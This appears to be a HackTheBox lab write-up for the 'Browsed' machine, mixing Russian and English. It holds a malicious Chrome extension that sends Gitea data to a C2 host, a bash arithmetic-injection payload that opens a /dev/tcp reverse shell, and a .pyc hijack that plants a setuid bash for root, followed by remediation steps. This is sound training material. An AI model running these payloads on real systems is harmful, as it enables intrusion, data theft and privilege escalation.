---
tags:
  - HackTheBox
  - XSS
  - SSRF
  - PythonPycHijacking
  - Flask
  - ChromeExtension
  - BashInjection
  - Gitea
OS: Linux
IP: browsed.htb
difficulty: Medium
---
# Machine Name: Browsed
**Date:** 17-03-2026

---

## Machine Info

- **OS:** Linux (Ubuntu)
- **Primary Apps:** Nginx 1.24.0, Flask (Python), Gitea 1.24.5, Google Chrome for Testing
- **Role:** Medium — Web/Browser Extension Attack Chain
- **Interesting Findings:** Malicious Chrome Extension upload → SSRF to internal Flask app → Bash arithmetic injection RCE → Python `.pyc` hijacking for privesc

---

## 1. Reconnaissance

**Nmap scan:**

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.244.79
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
```

**Findings:**

- Порт 80: веб-форма для загрузки Chrome Extension (`.zip`)
- После загрузки бэкенд-бот (Chrome for Testing) устанавливает расширение и посещает два хоста:
    - `http://localhost/` — простой статичный сайт
    - `http://browsedinternals.htb/` — Gitea 1.24.5 (внутренний git-сервер)
- Flask-приложение `MarkdownPreview` работает на `localhost:5000` (недоступен снаружи)

---

## 2. Exploitation

### Шаг 1 — Malicious Chrome Extension (XSS/SSRF via Extension)

**Уязвимость:** Сервер принимает произвольные Chrome Extensions без валидации. Бот загружает расширение в браузер и посещает внутренние сервисы, что позволяет Content Script делать запросы от имени бота ко внутренней инфраструктуре.

**manifest.json:**

```json
{
  "manifest_version": 3,
  "name": "Feedback Checker",
  "version": "1.0",
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ],
  "host_permissions": ["<all_urls>"]
}
```

**content.js — разведка через Gitea API:**

```javascript
const C2 = 'http://10.10.14.31:8000';

function send(tag, data) {
  const payload = btoa(unescape(encodeURIComponent(String(data).slice(0, 4000))));
  fetch(`${C2}/?tag=${tag}&d=${payload}`, { mode: 'no-cors' });
}

send('ping', location.href);

// Gitea API — список репозиториев и файлов
fetch('http://browsedinternals.htb/api/v1/repos/larry/MarkdownPreview/git/trees/main?recursive=true', {
  credentials: 'include'
}).then(r => r.text()).then(t => send('tree', t));

fetch('http://browsedinternals.htb/api/v1/repos/larry/MarkdownPreview/raw/app.py?ref=main', {
  credentials: 'include'
}).then(r => r.text()).then(t => send('file_app.py', t));
```

**Результат разведки:**

- Найден репозиторий `larry/MarkdownPreview` с Flask-приложением
- `app.py` содержит уязвимый эндпоинт `/routines/<rid>`
- `routines.sh` — bash-скрипт, принимающий `$1` и использующий `-eq` для сравнения

---

### Шаг 2 — Bash Arithmetic Injection → RCE

**Уязвимость:** Эндпоинт `/routines/<rid>` передаёт параметр напрямую в `subprocess.run(["./routines.sh", rid])`. В `routines.sh` параметр используется в bash-конструкции `[[ "$1" -eq 0 ]]`. Bash вычисляет арифметические выражения внутри `[[ ... -eq ... ]]`, что позволяет выполнить подстановку команды через `a[$(cmd)]`.

**Уязвимый код в app.py:**

```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

**Уязвимый код в routines.sh:**

```bash
if [[ "$1" -eq 0 ]]; then
```

**Payload (content.js — reverse shell):**

```javascript
// bash -i >& /dev/tcp/10.10.14.31/4444 0>&1  →  base64
const b64cmd = btoa('bash -i >& /dev/tcp/10.10.14.31/4444 0>&1');
const rid = encodeURIComponent(`a[$(echo ${b64cmd}|base64 -d|bash)]`);

fetch(`http://localhost:5000/routines/${rid}`, {
  mode: 'no-cors',
  credentials: 'include'
});
```

**Листенер:**

```bash
nc -lvnp 4444
```

**Результат:** Reverse shell от имени `www-data`.

Lateral movement до `larry` осуществлялся через доступные файлы в `/home/larry/markdownPreview/`.

---

## 3. Privilege Escalation

### Python `.pyc` Hijacking

**Strategy:** `larry` имеет право запускать `/opt/extensiontool/extension_tool.py` как root без пароля (`NOPASSWD`). Скрипт импортирует `extension_utils` относительным импортом. Директория `__pycache__` имеет права `rwxrwxrwx`, что позволяет создать вредоносный `.pyc` файл.

**Findings:**

```bash
sudo -l
# (root) NOPASSWD: /opt/extensiontool/extension_tool.py

ls -la /opt/extensiontool/__pycache__
# drwxrwxrwx — любой может писать
```

**Exploit — создание вредоносного .pyc:**

```python
python3.12 << 'EOF'
import struct, marshal, os, importlib.util

stat = os.stat('/opt/extensiontool/extension_utils.py')
mtime = int(stat.st_mtime)
size = stat.st_size
magic = importlib.util.MAGIC_NUMBER

src = """
import subprocess
def validate_manifest(path):
    subprocess.run(['cp', '/bin/bash', '/tmp/bash'])
    subprocess.run(['chmod', '+s', '/tmp/bash'])
    return {"version": "1.0.0", "manifest_version": 3, "name": "x"}
def clean_temp_files(x):
    pass
"""
code = compile(src, '/opt/extensiontool/extension_utils.py', 'exec')

with open('/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc', 'wb') as f:
    f.write(magic)
    f.write(struct.pack('<I', 0))
    f.write(struct.pack('<I', mtime))
    f.write(struct.pack('<I', size))
    marshal.dump(code, f)
EOF

sudo /opt/extensiontool/extension_tool.py --ext Fontify
/tmp/bash -p
# root
```

---

## 4. Remediation

- [ ] **Фикс 1 — Валидация загружаемых расширений:** Проверять содержимое загружаемых `.zip` файлов на стороне сервера — разрешать только расширения из whitelist или с цифровой подписью. Sandbox для бота должен ограничивать доступ к внутренним сервисам (`localhost`, `browsedinternals.htb`).

- [ ] **Фикс 2 — Санитизация параметра `rid`:** В `app.py` валидировать параметр перед передачей в скрипт — принимать только цифры (`rid.isdigit()`). В `routines.sh` использовать = вместо `-eq` для строкового сравнения, чтобы избежать арифметической интерпретации.

- [ ] **Фикс 3 — Права на `__pycache__` и модули:** Директорию `__pycache__` сделать доступной только для root (`chmod 755`). Файл `extension_utils.py` убрать из группы с правом записи (`chmod 644`, владелец root). Использовать абсолютные импорты или проверять целостность `.pyc` файлов перед запуском привилегированного скрипта.
